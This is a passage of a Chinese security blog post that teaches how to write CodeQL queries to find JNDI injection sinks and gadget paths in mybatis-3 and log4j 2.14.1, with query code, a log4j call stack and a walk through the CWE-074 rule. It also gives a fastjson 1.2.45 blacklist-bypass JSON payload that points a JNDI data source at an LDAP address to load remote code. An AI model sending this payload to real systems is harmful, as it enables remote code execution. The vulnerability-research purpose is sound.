number">3</span>    <span class="token operator">or</span>    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"set%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>  }}query predicate edges<span class="token punctuation">(</span>Callable a<span class="token punctuation">,</span> Callable b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>polyCalls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }<span class="token keyword">from</span> LookupMethod endcall<span class="token punctuation">,</span> GetterCallable entryPoint<span class="token punctuation">,</span> Callable endCallAble<span class="token keyword">where</span>  endcall<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> endCallAble <span class="token operator">and</span>  edges<span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> endCallAble<span class="token punctuation">)</span><span class="token keyword">select</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Geter jndi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以去<a href="https://lgtm.com进行在线查询。先在线导入mybatis-3：">https://lgtm.com进行在线查询。先在线导入mybatis-3：</a></p><p><img src="/.%5Ccodeql_for_java.assets%5Cimage-20220616172143632.png" alt="image-20220616172143632"></p><p>箭头处添加github链接，即可导入到自己的项目列表中</p><p>在线查询结果中存在大家都知道的fastjson 1.2.45黑名单绕过思路</p><p><img src="https://s2.loli.net/2022/07/11/Z3lWVYdeISsrAzk.png" alt="image-20220616172500693"></p><p>payload：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>    <span class="token property">"properties"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们先对语句进行分析。</p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class LookupMethod extends <span class="token keyword">Call</span> {  LookupMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是尝试定位到<code>jndi</code>注入的触发点<code>javax.naming#lookup</code>，并且需要是<code>Context</code>实例化对象进行<code>lookup</code>方法操作。</p><p><img src="https://s2.loli.net/2022/07/11/LG1TAI876FzqXiO.png" alt="image-20220616173005215"></p><p>定义继承<code>Call</code>的<code>LookupMethod</code>类来进行实现。在上面我们提到，<code>getCallee()</code> 返回函数声明的位置,指定方法名<code>lookup</code>；使用<code>getASupertype()</code>指向其所有父类，再使用<code>hasQualifiedName("javax.naming", "Context")</code>准确限制<code>import</code>中存在<code>import javax.naming.Context;</code>。</p><p><img src="https://s2.loli.net/2022/07/11/u6vcLi9FBG4kt7b.png" alt="image-20220617095549270"></p><p>单独实现此类使用ql查询，可获得所有能触发<code>jndi</code>注入的<code>lookup</code>方法。</p><p><img src="https://s2.loli.net/2022/07/11/UpvQmtxR12ZE9SL.png" alt="image-20220617095955811"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class GetterCallable extends Callable {  GetterCallable<span class="token punctuation">(</span><span class="token punctuation">)</span> {    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span>    <span class="token operator">or</span>    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"set%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>    getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现继承<code>Callable</code>的<code>GetterCallable</code>类，用于查找所有的getter和setter使用<code>hasNoParameters()</code>限制getter无参，使用<code>getNumberOfParameters()</code>限制setter参数只有一个，使其符合fastjson漏洞的触发条件。</p><p>单独实现，获取所有符合条件的setter和getter：</p><p><img src="https://s2.loli.net/2022/07/11/sFBqOIlwMoKuDXA.png" alt="image-20220617101002542"></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">query predicate edges<span class="token punctuation">(</span>Callable a<span class="token punctuation">,</span> Callable b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>polyCalls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }<span class="token keyword">from</span> LookupMethod endcall<span class="token punctuation">,</span> GetterCallable entryPoint<span class="token punctuation">,</span> Callable endCallAble<span class="token keyword">where</span>  endcall<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> endCallAble <span class="token operator">and</span>  edges<span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> endCallAble<span class="token punctuation">)</span><span class="token keyword">select</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Geter jndi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主体的查询语句中定义了谓词<code>edges(Callable a, Callable b) { a.polyCalls(b) }</code>。这里查看的是函数声明的继承关系，如果我们想知道方法A到方法G之间调用端点路径，可以将<code>polyCalls</code>替换为<code>calls</code>来实现：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass StartMethod extends Method {  StartMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> { getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"main"</span> }}class TargetMethod extends Method {  TargetMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> { getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"vulMain"</span> }}query predicate edges<span class="token punctuation">(</span>Method a<span class="token punctuation">,</span> Method b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>calls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }<span class="token keyword">from</span> TargetMethod <span class="token keyword">end</span><span class="token punctuation">,</span> StartMethod entryPoint<span class="token keyword">where</span> edges<span class="token operator">+</span><span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> <span class="token keyword">end</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token keyword">end</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> <span class="token keyword">end</span><span class="token punctuation">,</span> <span class="token string">"Found a path from start to target."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>事实上调用谓词edges就是构建gadget的过程。</p><h2 id="Log4j-with-codeql"><a href="#Log4j-with-codeql" class="headerlink" title="Log4j with codeql"></a>Log4j with codeql</h2><p>找到了之前分析<code>log4j </code>的文章，网传<code>log4j</code>漏洞是在线查出来的<code>sink</code>点，找到了存在于老版本<code>log4j</code>的<code>lookup</code>方法。我们也跟着尝试一下构建ql语言看能不能把漏洞完整分析出来</p><p>log4j源码地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.14.1-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.14.1-rc1</a></p><p>codeql环境配置及使用方式请移步站内其他大哥的文章</p><p>先贴上调用链</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">lookup<span class="token operator">:</span><span class="token number">417</span><span class="token punctuation">,</span> <span class="token class-name">InitialContext</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">)</span>lookup<span class="token operator">:</span><span class="token number">172</span><span class="token punctuation">,</span> <span class="token class-name">JndiManager</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">)</span>lookup<span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token class-name">JndiLookup</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>lookup<span class="token operator">:</span><span class="token number">221</span><span class="token punctuation">,</span> <span class="token class-name">Interpolator</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>resolveVariable<span class="token operator">:</span><span class="token number">1110</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>substitute<span class="token operator">:</span><span class="token number">1033</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>substitute<span class="token operator">:</span><span class="token number">912</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>replace<span class="token operator">:</span><span class="token number">467</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>format<span class="token operator">:</span><span class="token number">132</span><span class="token punctuation">,</span> <span class="token class-name">MessagePatternConverter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">)</span>format<span class="token operator">:</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token class-name">PatternFormatter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">)</span>toSerializable<span class="token operator">:</span><span class="token number">344</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span>$<span class="token class-name">PatternSerializer</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>toText<span class="token operator">:</span><span class="token number">244</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>encode<span class="token operator">:</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>encode<span class="token operator">:</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>directEncodeEvent<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>tryAppend<span class="token operator">:</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>append<span class="token operator">:</span><span class="token number">181</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>tryCallAppender<span class="token operator">:</span><span class="token number">156</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>callAppender0<span class="token operator">:</span><span class="token number">129</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>callAppenderPreventRecursion<span class="token operator">:</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>callAppender<span class="token operator">:</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>callAppenders<span class="token operator">:</span><span class="token number">540</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>processLogEvent<span class="token operator">:</span><span class="token number">498</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>log<span class="token operator">:</span><span class="token number">481</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>log<span class="token operator">:</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>log<span class="token operator">:</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token class-name">DefaultReliabilityStrategy</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>log<span class="token operator">:</span><span class="token number">161</span><span class="token punctuation">,</span> <span class="token class-name">Logger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">)</span>tryLogMessage<span class="token operator">:</span><span class="token number">2205</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>logMessageTrackRecursion<span class="token operator">:</span><span class="token number">2159</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>logMessageSafely<span class="token operator">:</span><span class="token number">2142</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>logMessage<span class="token operator">:</span><span class="token number">2017</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>logIfEnabled<span class="token operator">:</span><span class="token number">1983</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>error<span class="token operator">:</span><span class="token number">740</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>main<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">,</span> logshell <span class="token punctuation">(</span>com<span class="token punctuation">.</span>yxxx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-sink"><a href="#find-sink" class="headerlink" title="find sink"></a>find sink</h3><h4 id="CWE-074"><a href="#CWE-074" class="headerlink" title="CWE-074"></a>CWE-074</h4><p><code>CWE-074</code>规则之前一直处于试验状态，现在转正过了试用期，变成正式的规则了。</p><p>存在于<code>java\ql\src\Security\CWE\CWE-074\JndiInjection.ql</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/** * @name JNDI lookup with user-controlled name * @description Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted *              object and to execution of arbitrary code. * @kind path-problem * @problem.severity error * @security-severity 9.8 * @precision high * @id java/jndi-injection * @tags security *       external/cwe/cwe-074 */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>JndiInjectionQuery<span class="token keyword">import</span> DataFlow::PathGraph<span class="token keyword">from</span> DataFlow::PathNode source<span class="token punctuation">,</span> DataFlow::PathNode sink<span class="token punctuation">,</span> JndiInjectionFlowConfig conf<span class="token keyword">where</span> conf<span class="token punctuation">.</span>hasFlowPath<span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span><span class="token keyword">select</span> sink<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span>getNode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token string">"this user input"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>据说<code>log4j</code>的sink就是<code>CWE-074</code>扫出来的。我们观察一下他的源码：</p><p>这里使用了定义的<code>source</code>和<code>sink</code>，导入<code>DataFlow::PathNode</code>来检查数据流。<code>source</code>和<code>sink</code>的定义在<code>JndiInjectionFlowConfig</code>中，我们进入查看：</p><p><code>java\ql\lib\semmle\code\java\security\JndiInjectionQuery.qll</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class JndiInjectionFlowConfig extends TaintTracking::Configuration {  JndiInjectionFlowConfig<span class="token punctuation">(</span><span class="token punctuation">)</span> { this <span class="token operator">=</span> <span class="token string">"JndiInjectionFlowConfig"</span> }  override predicate isSource<span class="token punctuation">(</span>DataFlow::Node source<span class="token punctuation">)</span> { source instanceof RemoteFlowSource }  override predicate isSink<span class="token punctuation">(</span>DataFlow::Node sink<span class="token punctuation">)</span> { sink instanceof JndiInjectionSink }  override predicate isSanitizer<span class="token punctuation">(</span>DataFlow::Node node<span class="token punctuation">)</span> {    node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof PrimitiveType <span class="token operator">or</span> node<span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof BoxedType  }  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先关注漏洞触发点的定义<code>isSink</code>，使用的是<code>JndiInjectionSink</code>，继续跟入：</p><p><code>java\ql\lib\semmle\code\java\security\JndiInjection.qll</code></p><p>在此处定义了可以导致jndi注入的相关类及其可触发漏洞的方法</p><p><img src="https://s2.loli.net/2022/07/11/pTYFHjktGrLSJws.png" alt="image-20220620162913850"></p><p>看起来还是比较全面的。我们回去测一下<code>isSink</code>看能不能找到<code>log4j</code>漏洞的<code>sink</code></p><p><img src="https://s2.loli.net/2022/07/11/Pyajg8UBxwhcEGH.png" alt="image-20220620163256712"></p><p>成功定位到<code>org.apache.logging.log4j.core.net.JndiManager#lookup</code></p><h4 id="自建脚本寻找"><a href="#自建脚本寻找" class="headerlink" title="自建脚本寻找"></a>自建脚本寻找</h4><p>如果我们自己写规则去寻找能触发jndi注入的<code>sink</code>点呢？</p><p>这里有个项目：</p><p><a href="https://github.dev/SummerSec/LookupInterface">https://github.dev/SummerSec/LookupInterface</a></p><p>此项目中同样定义了很全的JNDI注入查询规则。我们可以copy下来进行实现：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> javaclass Context extends  RefType{    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"InitialContext"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>         this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiTemplate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.springframework.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"org.apache.shiro.jndi"</span><span class="token punctuation">,</span> <span class="token string">"JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiCallback"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiLocatorDelegate"</span><span class="token punctuation">)</span>        <span class="token operator">or</span>        this<span class="token punctuation">.</span>getQualifiedName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"%JndiTemplate"</span><span class="token punctuation">)</span>    }}<span class="token keyword">from</span> <span class="token keyword">Call</span> <span class="token keyword">call</span><span class="token punctuation">,</span>Callable parseExpression<span class="token keyword">where</span>    <span class="token keyword">call</span><span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> parseExpression <span class="token operator">and</span>    parseExpression<span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span> instanceof Context <span class="token operator">and</span>    parseExpression<span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token keyword">call</span><span class="token punctuation">,</span> parseExpression<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处ql语句很好理解就不多赘述了。结果也是成功定位到<code>lookup</code>：</p><p><img src="https://s2.loli.net/2022/07/11/nU3pjhsP5m4VoaG.png" alt="image-20220620165014094"></p><p><code>find sink</code>的过程相对简单，难点是向上寻找<code>source</code>触发和使用<code>gadget</code>连接<code>sink</code>和<code>source</code>。</p><h3 id="search-gadget"><a href="#search-gadget" class="headerlink" title="search gadget"></a>search gadget</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">/** *@name Tainttrack Context lookup *@kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow::PathGraphclass Context extends  RefType{    Context<span class="token punctuation">(</span><span class="token punctuation">)</span>{        this<span class="token punctuation">.</span>hasQualifiedName<span class="token 